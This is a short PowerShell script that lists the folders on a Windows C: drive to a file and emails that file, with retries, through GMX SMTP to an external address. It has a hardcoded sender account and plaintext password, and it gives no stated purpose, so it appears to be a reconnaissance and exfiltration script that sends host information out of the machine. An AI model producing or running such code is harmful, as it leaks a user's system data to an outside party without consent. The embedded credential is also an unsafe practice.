$senderEmail = "jhonhkfj@gmx.com"
$recipientEmail = "recipient@emcd.com"
$subject = "Folder List"
$body = "Please find attached the folder list."
$attachmentPath = Join-Path -Path ([System.Environment]::ExpandEnvironmentVariables("%USERPROFILE%")) -ChildPath "folder_list.txt"
$smtpServer = "mail.gmx.com"
$username = "your_username"
$password = "john@201"

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePassword

# Folder listing
Get-ChildItem -Path "C:\" -Directory -Depth 1 | Select-Object -ExpandProperty FullName | Out-File -FilePath $attachmentPath

# Wait for 10 seconds
Start-Sleep -Seconds 10

$maxRetries = 5
$retryIntervalMinutes = 10
$retryCount = 0
$success = $false

while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        # Email sending
        $result = Send-MailMessage -From $senderEmail -To $recipientEmail -Subject $subject -Body $body -Attachments $attachmentPath -SmtpServer $smtpServer -Credential $credentials
        $success = $true
        Write-Output "Email sent successfully."
    } catch {
        $retryCount++
        Write-Output "Failed to send email: $($_.Exception.Message)"
        Write-Output "Retry attempt: $retryCount"
        if ($retryCount -lt $maxRetries) {
            Write-Output "Retrying in $retryIntervalMinutes minutes..."
            Start-Sleep -Seconds ($retryIntervalMinutes * 60)
        }
    }
}

if (-not $success) {
    Write-Output "Maximum retries reached. Failed to send the email."
}
